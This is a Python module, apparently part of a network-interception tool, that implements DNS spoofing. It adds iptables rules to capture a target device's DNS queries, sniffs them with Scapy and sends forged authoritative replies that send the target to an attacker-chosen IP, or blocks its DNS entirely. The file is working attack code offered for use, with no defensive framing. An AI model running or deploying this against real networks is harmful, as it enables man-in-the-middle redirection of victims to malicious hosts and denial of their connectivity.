"""
network/dns_spoof.py — DNS intercept and redirection.

Uses iptables REDIRECT to intercept UDP/53 and Scapy to craft spoofed responses.
This allows us to redirect specific domains (e.g. google.com) to a local IP
or simply block DNS entirely for a device.
"""
from __future__ import annotations

import subprocess
import threading
import time
from scapy.all import IP, UDP, DNS, DNSRR, send

class DnsSpoofManager:
    def __init__(self):
        self._lock = threading.Lock()
        self._spoof_map: dict[str, str] = {} # target_ip -> redirect_to_ip
        self._running = False

    def start_spoof(self, target_ip: str, redirect_to: str = "1.2.3.4"):
        """Intercept and redirect DNS for target_ip."""
        with self._lock:
            self._spoof_map[target_ip] = redirect_to
        
        # Add iptables REDIRECT rule to capture DNS traffic (requires our machine to be target's gateway)
        # We redirect target's UDP/53 to our Port 5353 (where we sniff)
        try:
            subprocess.run([
                "iptables", "-t", "nat", "-I", "PREROUTING",
                "-s", target_ip, "-p", "udp", "--dport", "53",
                "-j", "REDIRECT", "--to-ports", "5353"
            ], capture_output=True)
        except Exception:
            pass

        if not self._running:
            self._running = True
            threading.Thread(target=self._sniff_loop, daemon=True, name="dns_spoof").start()

    def stop_spoof(self, target_ip: str):
        with self._lock:
            self._spoof_map.pop(target_ip, None)
        
        # Cleanup iptables
        try:
            subprocess.run([
                "iptables", "-t", "nat", "-D", "PREROUTING",
                "-s", target_ip, "-p", "udp", "--dport", "53",
                "-j", "REDIRECT", "--to-ports", "5353"
            ], capture_output=True)
        except Exception:
            pass

    def _sniff_loop(self):
        # We use a raw socket to sniff the redirected packets on 5353
        # Or more simply, since we are in modular mode, we can use Scapy sniff
        from scapy.all import sniff
        
        def _cb(pkt):
            try:
                if not pkt.haslayer(DNS) or pkt[DNS].qr != 0:
                    return
                if not pkt.haslayer(IP) or not pkt.haslayer(UDP):
                    return
                if not pkt[DNS].qd:
                    return

                src_ip = pkt[IP].src
                with self._lock:
                    if src_ip not in self._spoof_map:
                        return
                    redirect_to = self._spoof_map[src_ip]

                # Craft spoofed response
                qname = pkt[DNS].qd.qname
                spoofed_pkt = (
                    IP(dst=pkt[IP].src, src=pkt[IP].dst) /
                    UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) /
                    DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, qr=1,
                        an=DNSRR(rrname=qname, ttl=10, rdata=redirect_to))
                )
                send(spoofed_pkt, verbose=False)
            except Exception:
                # A single malformed packet must not tear down the sniffer.
                return

        # Sniff on 5353 (where packets were redirected). Restart on transient
        # interface errors instead of permanently disabling the engine.
        while self._running:
            try:
                sniff(filter="udp port 5353", prn=_cb, store=0, timeout=10)
            except Exception:
                if self._running:
                    time.sleep(2)

    def stop_all(self):
        self._running = False
        with self._lock:
            ips = list(self._spoof_map.keys())
        for ip in ips:
            self.stop_spoof(ip)
